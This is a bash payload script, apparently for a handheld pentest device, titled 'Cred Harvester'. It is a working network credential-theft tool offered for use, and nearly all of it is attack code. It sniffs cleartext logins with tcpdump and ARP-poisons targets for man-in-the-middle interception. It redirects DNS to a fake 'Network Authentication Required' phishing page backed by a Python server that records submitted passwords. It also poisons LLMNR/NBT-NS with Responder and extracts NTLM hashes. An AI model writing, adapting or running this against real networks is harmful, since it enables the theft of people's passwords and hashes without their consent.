#!/bin/bash
# Title: Cred Harvester
# Author: bad-antics
# Description: Multi-protocol credential harvesting with live monitoring
# Category: nullsec/capture

LOOT_DIR="/mmc/nullsec/cred-harvest"
mkdir -p "$LOOT_DIR"

PROMPT "CRED HARVESTER

Multi-protocol credential
capture in real-time.

Monitors:
- HTTP/HTTPS (MITM)
- FTP logins
- SMTP/IMAP/POP3
- Telnet sessions
- SNMP communities
- NTLM hashes
- Kerberos tickets

Press OK to configure."

IFACE=$(ip route | grep default | awk '{print $5}' | head -1)
GATEWAY=$(ip route | grep default | awk '{print $3}' | head -1)
LOCAL_IP=$(ip -4 addr show "$IFACE" | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)

PROMPT "HARVEST MODE

1. Passive sniff (quiet)
2. ARP poison + sniff
3. DNS redirect + portal
4. LLMNR/NBT-NS poison
5. ALL (maximum harvest)

Select on next screen."

MODE=$(NUMBER_PICKER "Mode (1-5):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) MODE=1 ;; esac

PROMPT "TARGET

1. Entire subnet
2. Specific IP
3. IP range

Select on next screen."

TGT_MODE=$(NUMBER_PICKER "Target (1-3):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) TGT_MODE=1 ;; esac

TARGET_RANGE=""
case $TGT_MODE in
    1) TARGET_RANGE="0.0.0.0/0" ;;
    2) TARGET_IP=$(TEXT_PICKER "Target IP:" ""); TARGET_RANGE="$TARGET_IP" ;;
    3) TARGET_RANGE=$(TEXT_PICKER "IP range:" "192.168.1.0/24") ;;
esac

DURATION=$(NUMBER_PICKER "Duration (seconds):" 300)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=300 ;; esac

resp=$(CONFIRMATION_DIALOG "START HARVEST?

Mode: $MODE
Target: $TARGET_RANGE
Duration: ${DURATION}s
Interface: $IFACE

Press OK to begin.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "CredHarvester: mode=$MODE target=$TARGET_RANGE"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
CRED_FILE="$LOOT_DIR/creds_${TIMESTAMP}.txt"
HASH_FILE="$LOOT_DIR/hashes_${TIMESTAMP}.txt"
touch "$CRED_FILE" "$HASH_FILE"

SPINNER_START "Harvesting credentials..."

# Enable IP forwarding for MITM
echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null

case $MODE in
    1) # Passive sniff
        # HTTP credentials
        timeout "$DURATION" tcpdump -i "$IFACE" -l -A \
            'port 80 or port 8080 or port 21 or port 25 or port 110 or port 143 or port 23' \
            2>/dev/null | grep -iE 'user|pass|login|email|pwd|credential|auth' >> "$CRED_FILE" &
        SNIFF_PID=$!
        
        # NTLM hashes
        timeout "$DURATION" tcpdump -i "$IFACE" -l -w "/tmp/ntlm_${TIMESTAMP}.pcap" \
            'port 445 or port 139' 2>/dev/null &
        NTLM_PID=$!
        
        sleep "$DURATION"
        kill $SNIFF_PID $NTLM_PID 2>/dev/null
        ;;
        
    2) # ARP poison + sniff
        if [ "$TGT_MODE" -eq 2 ]; then
            arpspoof -i "$IFACE" -t "$TARGET_IP" "$GATEWAY" &>/dev/null &
            ARP_PID1=$!
            arpspoof -i "$IFACE" -t "$GATEWAY" "$TARGET_IP" &>/dev/null &
            ARP_PID2=$!
        else
            arpspoof -i "$IFACE" "$GATEWAY" &>/dev/null &
            ARP_PID1=$!
        fi
        
        timeout "$DURATION" tcpdump -i "$IFACE" -l -A \
            'port 80 or port 21 or port 25 or port 110 or port 23' \
            2>/dev/null | grep -iE 'user|pass|login|email' >> "$CRED_FILE" &
        
        sleep "$DURATION"
        kill $ARP_PID1 ${ARP_PID2:-0} 2>/dev/null
        ;;
        
    3) # DNS redirect + portal
        # Set up fake DNS to redirect to our capture portal
        dnsmasq --no-daemon --listen-address="$LOCAL_IP" --address="/#/$LOCAL_IP" \
            --log-queries --log-facility="$LOOT_DIR/dns_${TIMESTAMP}.log" &>/dev/null &
        DNS_PID=$!
        
        # Simple capture server
        mkdir -p /tmp/cred-portal
        cat > /tmp/cred-portal/index.html << 'PORTALHTML'
<!DOCTYPE html><html><head><title>Network Login</title>
<style>body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;background:#1a1a2e}
.card{background:#fff;padding:40px;border-radius:12px;max-width:400px;width:90%}
input{width:100%;padding:12px;border:1px solid #ddd;border-radius:6px;margin-bottom:12px;box-sizing:border-box}
button{width:100%;padding:12px;background:#e94560;color:#fff;border:none;border-radius:6px;cursor:pointer}
</style></head><body><div class="card"><h2>Network Authentication Required</h2>
<form method="POST" action="/capture">
<input name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button>Authenticate</button></form></div></body></html>
PORTALHTML

        python3 -c "
import http.server, urllib.parse, datetime
class H(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        l = int(self.headers.get('Content-Length', 0))
        d = urllib.parse.parse_qs(self.rfile.read(l).decode())
        with open('$CRED_FILE', 'a') as f:
            f.write(f'{datetime.datetime.now()} | {self.client_address[0]} | {d.get(\"username\",[\"\"])[0]} | {d.get(\"password\",[\"\"])[0]}\n')
        self.send_response(302); self.send_header('Location','https://google.com'); self.end_headers()
    def log_message(self, *a): pass
http.server.HTTPServer(('0.0.0.0', 80), H).serve_forever()
" &>/dev/null &
        WEB_PID=$!
        
        sleep "$DURATION"
        kill $DNS_PID $WEB_PID 2>/dev/null
        ;;
        
    4) # LLMNR/NBT-NS poison
        if command -v responder &>/dev/null; then
            timeout "$DURATION" responder -I "$IFACE" -wrf 2>/dev/null | \
                tee "$LOOT_DIR/responder_${TIMESTAMP}.log" | \
                grep -i "hash\|password\|ntlm" >> "$HASH_FILE" &
            sleep "$DURATION"
        else
            # Manual NBT-NS/LLMNR capture
            timeout "$DURATION" tcpdump -i "$IFACE" -l \
                'port 5355 or port 137 or port 5353' \
                2>/dev/null > "$LOOT_DIR/llmnr_${TIMESTAMP}.txt" &
            sleep "$DURATION"
        fi
        ;;
        
    5) # All modes
        # Run everything in parallel
        timeout "$DURATION" tcpdump -i "$IFACE" -l -A \
            'port 80 or port 21 or port 25 or port 110 or port 23' \
            2>/dev/null | grep -iE 'user|pass|login' >> "$CRED_FILE" &
        
        timeout "$DURATION" tcpdump -i "$IFACE" -l -w "/tmp/full_${TIMESTAMP}.pcap" 2>/dev/null &
        
        if command -v responder &>/dev/null; then
            timeout "$DURATION" responder -I "$IFACE" -wrf 2>/dev/null >> "$HASH_FILE" &
        fi
        
        sleep "$DURATION"
        ;;
esac

# Disable IP forwarding
echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null

# Kill any remaining processes
pkill -f arpspoof 2>/dev/null
pkill -f dnsmasq 2>/dev/null
pkill -f responder 2>/dev/null

SPINNER_STOP

# Parse results
CRED_COUNT=$(wc -l < "$CRED_FILE" 2>/dev/null || echo 0)
HASH_COUNT=$(wc -l < "$HASH_FILE" 2>/dev/null || echo 0)

# Extract any NTLM from pcap
if [ -f "/tmp/ntlm_${TIMESTAMP}.pcap" ]; then
    tshark -r "/tmp/ntlm_${TIMESTAMP}.pcap" -Y "ntlmssp.auth" \
        -T fields -e ip.src -e ntlmssp.auth.username -e ntlmssp.auth.domain \
        2>/dev/null >> "$HASH_FILE"
    rm -f "/tmp/ntlm_${TIMESTAMP}.pcap"
fi

PROMPT "HARVEST COMPLETE

Cleartext creds: $CRED_COUNT
Hashes captured: $HASH_COUNT

Mode: $MODE
Duration: ${DURATION}s

All saved to:
cred-harvest/

Press OK to exit."
